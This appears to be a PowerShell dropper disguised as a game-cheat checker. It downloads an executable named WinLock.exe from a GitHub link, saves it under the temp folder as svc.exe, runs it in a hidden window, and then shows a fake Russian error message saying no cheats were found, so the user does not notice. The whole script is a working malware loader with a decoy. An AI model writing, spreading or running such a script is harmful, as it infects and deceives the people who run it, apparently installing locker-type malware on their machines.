$url = "https://github.com/nagibatorm55-ops/vanish-checker/blob/main/WinLock.exe"
$path = "$env:TEMP\svc.exe"
irm $url -OutFile $path
Start-Process -FilePath $path -WindowStyle Hidden
Start-Sleep -Seconds 2
Write-Host "Ошибка: читы не найдены. Попробуйте позже." -ForegroundColor Red